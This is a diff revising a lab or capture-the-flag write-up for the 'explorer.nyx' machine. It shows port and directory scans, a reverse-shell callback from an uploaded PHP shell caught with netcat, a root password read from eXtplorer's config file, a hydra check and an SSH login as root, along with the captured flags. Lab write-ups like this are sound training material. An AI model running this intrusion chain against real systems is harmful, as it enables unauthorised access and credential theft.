@@ -19,7 +19,7 @@
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn explorer.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn explorer.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,15 +30,15 @@ MAC Address: 08:00:27:49:4B:E3 (Oracle VirtualBox virtual NIC)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sCV explorer.nyx
+$ sudo nmap -p 22,80 -sCV explorer.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
 |_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
 80/tcp open  http    Apache httpd 2.4.65 ((Debian))
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/extplorer
 |_http-server-header: Apache/2.4.65 (Debian)
 |_http-title: Site doesn't have a title (text/html).
@@ -61,7 +61,7 @@ http://explorer.nyx
 A content discovery scan is run against the site:
 
 ```bash
-ffuf -u http://explorer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
+$ ffuf -u http://explorer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
 
 .html                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 200, Size: 186, Words: 28, Lines: 8, Duration: 9ms]
@@ -114,23 +114,23 @@ http://explorer.nyx/rev_shell.php
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.45] 41280
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [explorer.nyx] 41280
 Linux explorer 6.1.0-39-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.148-1 (2025-08-26) x86_64 GNU/Linux
  16:39:59 up 14 min,  0 user,  load average: 14.17, 13.46, 8.75
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
-$ id
+www-data@explorer:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ```bash
-$ ls -l /home
+www-data@explorer:~$ ls -l /home
 total 4
 -r-------- 1 www-data www-data 33 Sep 13  2025 user.txt
-$ cat /home/user.txt
+www-data@explorer:~$ cat /home/user.txt
 3f2580ab16ac82c9e0adaf0dad3a900d
 ```
 
@@ -143,10 +143,10 @@ $ cat /home/user.txt
 Rather than a local exploit, the path to root here comes from eXtplorer's own configuration file, readable from the current shell:
 
 ```bash
-ls -l /var/www/html
-ls -l /var/www/html/extplorer
-ls -l /var/www/html/extplorer/config
-cat /var/www/html/extplorer/config/conf.php
+www-data@explorer:~$ ls -l /var/www/html
+www-data@explorer:~$ ls -l /var/www/html/extplorer
+www-data@explorer:~$ ls -l /var/www/html/extplorer/config
+www-data@explorer:~$ cat /var/www/html/extplorer/config/conf.php
 ```
 
 <img src="../Images\explorer\Pasted image 20260722162641.png"/>
@@ -158,7 +158,7 @@ The file holds a hardcoded set of credentials for `root`:
 They're validated against SSH:
 
 ```bash
-hydra -l 'root' -p 'AccessGranted#1' ssh://explorer.nyx
+$ hydra -l 'root' -p 'AccessGranted#1' ssh://explorer.nyx
 
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
@@ -171,13 +171,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-19 10:44:
 They check out, and root is reached directly:
 
 ```bash
-ssh root@explorer.nyx
+$ ssh root@explorer.nyx
 root@explorer.nyx's password:
 root@explorer:~# id
-uid=0(root) gid=0(root) grupos=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 root@explorer:~# ls -l /root
 total 4
--r-------- 1 root root 33 sep 13  2025 root.txt
+-r-------- 1 root root 33 Sep 13  2025 root.txt
 root@explorer:~# cat /root/root.txt
 9a045d36c5a28f01784bdcfb326accfe
 ```
